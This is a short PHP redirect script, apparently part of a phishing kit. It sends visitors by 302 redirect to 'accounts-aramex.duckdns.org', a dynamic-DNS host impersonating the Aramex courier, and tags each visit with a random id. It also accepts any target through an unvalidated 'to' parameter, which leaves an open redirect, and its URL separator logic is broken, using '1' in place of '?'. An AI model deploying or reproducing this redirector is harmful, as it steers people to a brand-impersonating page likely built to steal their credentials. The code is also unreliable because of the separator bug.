<?php
$destination = 'https://accounts-aramex.duckdns.org/index.php';
if (isset($_GET['to']) && $_GET['to'] !== '') {
    $destination = $_GET['to'];
}

$code = rand(100000000, 999999999);
$separator = (strpos($destination, '?') !== false) ? '&' : '1';

header('Location: ' . $destination . $separator . 'id=' . $code, true, 302);
exit;
?>